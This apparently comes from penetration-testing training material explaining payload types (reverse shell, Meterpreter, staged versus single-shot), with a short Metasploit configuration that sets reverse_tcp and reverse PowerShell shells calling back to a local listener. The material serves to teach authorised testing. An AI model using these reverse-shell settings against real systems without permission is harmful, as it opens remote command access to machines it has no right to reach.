Payload types
Reverse shell
A simple callback that gives a command channel to the tester. Useful for quick proof but limited features.
Meterpreter
An advanced in-memory agent offering file access, process control, and scripted extensions for post-exploitation tasks.
Staged vs single-shot
Staged payloads fetch additional components after initial contact; single-shot contains all functionality in one transfer.
Misconception
The most feature-rich payload is not always the safest choice; complexity can increase detection and forensic footprint.
Configuration example
# Choose a payload for a Windows target
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444

# Or choose a simple reverse shell
set PAYLOAD cmd/windows/reverse_powershell
set LHOST 192.168.1.5
set LPORT 4444
Key Takeaway

Document the payload and rationale. Choose minimal capability that meets the proof objective while limiting persistent exposure.
